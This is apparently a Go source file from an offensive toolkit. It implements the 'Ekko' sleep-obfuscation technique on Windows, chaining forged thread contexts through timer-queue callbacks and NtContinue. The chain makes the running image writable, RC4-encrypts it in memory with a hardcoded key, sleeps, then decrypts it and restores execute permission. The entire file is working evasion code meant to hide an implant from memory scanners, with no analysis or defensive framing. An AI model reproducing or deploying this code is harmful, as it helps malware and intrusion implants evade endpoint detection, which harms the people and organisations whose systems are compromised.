package core

import (
	"golang.org/x/sys/windows"
	"log"
	"syscall"
	"unsafe"
)

const (
	WT_EXECUTEINTIMERTHREAD         = 0x00000020
	ThreadQuerySetWin32StartAddress = 0x9
)

var (
	// kernel32
	kernel32dll               = syscall.NewLazyDLL("kernel32.dll")
	procGetModuleHandleA      = kernel32dll.NewProc("GetModuleHandleA")
	procCreateEventW          = kernel32dll.NewProc("CreateEventW")
	procCreateTimerQueue      = kernel32dll.NewProc("CreateTimerQueue")
	procCreateTimerQueueTimer = kernel32dll.NewProc("CreateTimerQueueTimer")
	procRtlCaptureContext     = kernel32dll.NewProc("RtlCaptureContext")
	procVirtualProtect        = kernel32dll.NewProc("VirtualProtect")
	procWaitForSingleObject   = kernel32dll.NewProc("WaitForSingleObject")
	procSetEvent              = kernel32dll.NewProc("SetEvent")
	procDeleteTimerQueue      = kernel32dll.NewProc("DeleteTimerQueue")

	//ntdll
	ntdll          = syscall.NewLazyDLL("ntdll.dll")
	procNtContinue = ntdll.NewProc("NtContinue")

	//Advapi32
	Advapi32dll           = syscall.NewLazyDLL("Advapi32.dll")
	procSystemFunction032 = Advapi32dll.NewProc("SystemFunction032")
)

func Ekko(sleepTime uint64) error {

	var CtxThread CONTEXT
	var RopProtRW CONTEXT
	var RopMemEnc CONTEXT
	var RopDelay CONTEXT
	var RopMemDec CONTEXT
	var RopProtRX CONTEXT
	var RopSetEvt CONTEXT

	keybuf := [16]uint8{0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55}

	var Key, Img UString

	ImageBase, _, _ := procGetModuleHandleA.Call(uintptr(0))
	e_lfanew := *((*uint32)(unsafe.Pointer(ImageBase + 0x3c)))
	nt_header := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(ImageBase + uintptr(e_lfanew)))

	hEvent, _, _ := procCreateEventW.Call(0, 0, 0, 0)
	var hNewTimer, hTimerQueue uintptr
	hTimerQueue, _, _ = procCreateTimerQueue.Call()

	Img.Buffer = (*byte)(unsafe.Pointer(ImageBase))
	Img.Length = nt_header.OptionalHeader.SizeOfImage

	Key.Buffer = &keybuf[0]
	Key.Length = uint32(unsafe.Sizeof(Key))

	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procRtlCaptureContext.Addr(), uintptr(unsafe.Pointer(&CtxThread)), 0, 0, WT_EXECUTEINTIMERTHREAD)
	windows.WaitForSingleObject(windows.Handle(hEvent), 0x100)
	//fmt.Println(CtxThread)

	if CtxThread.Rip == 0 {
		log.Fatalln()
	}
	RopProtRW = CtxThread
	RopMemEnc = CtxThread
	RopDelay = CtxThread
	RopMemDec = CtxThread
	RopProtRX = CtxThread
	RopSetEvt = CtxThread

	var OldProtect uint64
	RopProtRW.Rsp -= 8
	RopProtRW.Rip = uint64(procVirtualProtect.Addr())
	RopProtRW.Rcx = uint64(ImageBase)
	RopProtRW.Rdx = uint64(nt_header.OptionalHeader.SizeOfImage)
	RopProtRW.R8 = windows.PAGE_READWRITE
	RopProtRW.R9 = uint64(uintptr(unsafe.Pointer(&OldProtect)))
	//fmt.Printf("\n[DEBUG] VirtualProtect: \n RIP: %x \n RCX: %x\n RDX: %x\n R8: %x\n R9: %x\n", RopProtRW.Rip, RopProtRW.Rcx, RopProtRW.Rdx, RopProtRW.R8, RopProtRW.R9)

	RopMemEnc.Rsp -= 8
	RopMemEnc.Rip = uint64(procSystemFunction032.Addr())
	RopMemEnc.Rcx = uint64(uintptr(unsafe.Pointer(&Img)))
	RopMemEnc.Rdx = uint64(uintptr(unsafe.Pointer(&Key)))
	//fmt.Printf("\n[DEBUG] SystemFunction032: \n RIP: %x \n RCX: %x\n RDX: %x\n R8: %x\n R9: %x\n", RopMemEnc.Rip, RopMemEnc.Rcx, RopMemEnc.Rdx, 0, 0)

	RopDelay.Rsp -= 8
	RopDelay.Rip = uint64(procWaitForSingleObject.Addr())
	RopDelay.Rcx = uint64(windows.CurrentProcess())
	RopDelay.Rdx = sleepTime
	//fmt.Printf("\n[DEBUG] WaitForSingleObject: \n RIP: %x \n RCX: %x\n RDX: %x\n R8: %x\n R9: %x\n", RopDelay.Rip, RopDelay.Rcx, RopDelay.Rdx, 0, 0)

	RopMemDec.Rsp -= 8
	RopMemDec.Rip = uint64(procSystemFunction032.Addr())
	RopMemDec.Rcx = uint64(uintptr(unsafe.Pointer(&Img)))
	RopMemDec.Rdx = uint64(uintptr(unsafe.Pointer(&Key)))
	//fmt.Printf("\n[DEBUG] SystemFunction032: \n RIP: %x \n RCX: %x\n RDX: %x\n R8: %x\n R9: %x\n", RopMemDec.Rip, RopMemDec.Rcx, RopMemDec.Rdx, 0, 0)

	RopProtRX.Rsp -= 8
	RopProtRX.Rip = uint64(procVirtualProtect.Addr())
	RopProtRX.Rcx = uint64(ImageBase)
	RopProtRX.Rdx = uint64(nt_header.OptionalHeader.SizeOfImage)
	RopProtRX.R8 = windows.PAGE_EXECUTE_READWRITE
	RopProtRX.R9 = uint64(uintptr(unsafe.Pointer(&OldProtect)))
	//fmt.Printf("\n[DEBUG] VirtualProtect: \n RIP: %x \n RCX: %x\n RDX: %x\n R8: %x\n R9: %x\n", RopProtRX.Rip, RopProtRX.Rcx, RopProtRX.Rdx, RopProtRX.R8, RopProtRX.R9)

	// SetEvent( hEvent );
	RopSetEvt.Rsp -= 8
	RopSetEvt.Rip = uint64(procSetEvent.Addr())
	RopSetEvt.Rcx = uint64(hEvent)

	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopProtRW)), 100, 0, WT_EXECUTEINTIMERTHREAD)
	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopMemEnc)), 200, 0, WT_EXECUTEINTIMERTHREAD)
	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopDelay)), 300, 0, WT_EXECUTEINTIMERTHREAD)
	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopMemDec)), 400, 0, WT_EXECUTEINTIMERTHREAD)
	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopProtRX)), 500, 0, WT_EXECUTEINTIMERTHREAD)
	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopSetEvt)), 600, 0, WT_EXECUTEINTIMERTHREAD)

	windows.WaitForSingleObject(windows.Handle(hEvent), windows.INFINITE)
	procDeleteTimerQueue.Call(hTimerQueue)
	return nil
}
